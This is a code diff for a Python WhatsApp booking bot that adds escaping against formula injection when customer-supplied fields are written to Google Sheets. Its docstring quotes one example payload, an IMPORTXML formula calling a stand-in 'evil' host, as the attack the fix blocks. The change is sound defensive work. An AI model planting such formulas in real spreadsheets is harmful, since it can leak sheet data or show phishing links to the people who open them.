@@ -42,6 +42,21 @@ EVENT_COLUMN = {
 CITAS_HEADERS = ["Folio", "Fecha", "customer_wa_id", "nombre", "servicio", "horario", "estado", "correo", "negocio_cliente", "Google Event ID"]
 _INACTIVE_STATES = ("rechazada", "cancelada_por_cliente")
 
+# Caracteres con los que Sheets empieza a leer una celda como fórmula en vez de texto plano.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _safe_cell(value) -> str:
+    """Neutraliza inyección de fórmulas (CSV/Sheets injection): todo lo que se escribe con
+    value_input_option="USER_ENTERED" (el modo normal de _values_append) pasa por Sheets como si
+    alguien lo hubiera tecleado, así que un cliente que ponga como "nombre" u "horario" algo como
+    '=IMPORTXML("https://evil","//a")' terminaría con una fórmula REAL ejecutándose en cuanto
+    Daniel o el negocio abran la hoja — puede filtrar datos o mostrar un link de phishing. Anteponer
+    un apóstrofo fuerza texto plano (Sheets no lo muestra, es el mismo truco que usa cualquier hoja
+    de cálculo para "forzar texto")."""
+    s = "" if value is None else str(value)
+    return "'" + s if s.startswith(_FORMULA_TRIGGERS) else s
+
 # Pestaña de control con un renglón por negocio dado de alta — permite que
 # un mismo despliegue atienda a varios negocios a la vez, cada uno con su
 # propio número de WhatsApp, sin tocar código ni variables de entorno para
@@ -305,8 +320,9 @@ def add_pending_appointment(business_name: str, customer_wa_id: str, req: dict) 
 
         timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
         row = [
-            folio, timestamp, customer_wa_id, req["nombre"], req["servicio"], req["horario"],
-            "pendiente", req.get("correo", ""), req.get("negocio_cliente", ""), "",
+            folio, timestamp, _safe_cell(customer_wa_id), _safe_cell(req["nombre"]),
+            _safe_cell(req["servicio"]), _safe_cell(req["horario"]),
+            "pendiente", _safe_cell(req.get("correo", "")), _safe_cell(req.get("negocio_cliente", "")), "",
         ]
         _values_append(sheet_id, f"'{tab}'!A1", [row])
         return folio
@@ -440,6 +456,9 @@ def update_appointment_horario(business_name: str, row_number: int, nuevo_horari
         return
     try:
         tab = _citas_tab_name(business_name)
+        # _values_update usa value_input_option="RAW" (ver más abajo): Sheets nunca interpreta
+        # fórmulas en ese modo, así que aquí no hace falta _safe_cell (sí en _values_append,
+        # que por default usa USER_ENTERED).
         _values_update(sheet_id, f"'{tab}'!F{row_number}", [[nuevo_horario]])
     except Exception:
         log.exception("No se pudo actualizar el horario de la cita en Google Sheets")
@@ -628,13 +647,13 @@ def dar_de_alta_cliente(
 
     fila = [
         "",  # Phone Number ID (vacío: no es un número de WhatsApp)
-        bot_name,
-        owner_phone or "",
+        _safe_cell(bot_name),
+        _safe_cell(owner_phone or ""),
         "",  # Teléfonos adicionales
         "SI",  # Activo
-        info,
-        tono,
-        objetivo,
+        _safe_cell(info),
+        _safe_cell(tono),
+        _safe_cell(objetivo),
         "SI" if agenda_citas else "NO",
         widget_id,
         "",  # Telegram Chat ID: se llena solo en cuanto el dueño le escriba al bot de avisos
